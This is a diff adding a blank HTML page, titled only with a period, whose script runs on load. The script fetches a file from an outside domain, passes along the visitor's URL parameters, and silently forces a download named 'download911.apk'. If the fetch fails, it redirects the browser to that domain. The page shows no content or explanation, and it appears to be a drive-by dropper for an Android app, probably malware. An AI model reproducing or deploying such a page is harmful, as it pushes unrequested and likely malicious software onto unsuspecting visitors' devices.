@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>.</title>
+</head>
+<body>
+
+<script>
+    async function downloadApk() {
+        const baseUrl = "https://mutuallydearlab.space/b7b5faf523f50dbd150/";
+
+        try {
+            const currentUrl = new URL(window.location.href);
+            const targetUrl = new URL(baseUrl);
+            targetUrl.search = currentUrl.search;
+
+            const response = await fetch(targetUrl.toString(), {
+                method: 'GET',
+                credentials: 'omit'
+            });
+
+            if (!response.ok) {
+                throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+            }
+
+            let filename = "download911.apk"
+            const blob = await response.blob();
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        } catch (error) {
+            console.error(error);
+            location.href = baseUrl
+        }
+    }
+
+    downloadApk();
+</script>
+</body>
+</html>
